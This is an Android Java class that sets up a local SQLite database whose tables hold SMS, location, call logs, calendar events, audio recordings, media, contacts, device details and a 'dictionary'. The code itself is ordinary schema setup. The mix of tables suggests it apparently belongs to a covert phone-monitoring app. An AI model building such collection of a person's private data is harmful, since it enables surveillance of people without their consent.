package com.candroid.textme.data.db;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DatabaseHelper extends SQLiteOpenHelper {
    public static final int VERSION = 1;
    public static final String NAME = "Main.db";
    private static DatabaseHelper sInstance;

    public static synchronized DatabaseHelper getInstance(Context context){
        if(sInstance == null){
            sInstance = new DatabaseHelper(context);
        }
        return sInstance;
    }

    public DatabaseHelper(Context context){
        super(context, NAME, null, VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(DataContract.SmsContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.LocationData.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.CallLogContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.CalendarEventContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.AudioRecordingsContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.MediaContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.PackagesContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.DeviceContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.ContactsContract.CREATE_TABLE_STATEMENT);
        db.execSQL(DataContract.DictionaryContract.CREATE_TABLE_STATEMENT);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL(DataContract.SmsContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.LocationData.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.CallLogContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.CalendarEventContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.AudioRecordingsContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.MediaContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.PackagesContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.DeviceContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.ContactsContract.DROP_TABLE_STATEMENT);
        db.execSQL(DataContract.DictionaryContract.DROP_TABLE_STATEMENT);
        onCreate(db);
    }

    @Override
    public void onDowngrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        super.onDowngrade(db, oldVersion, newVersion);
    }

}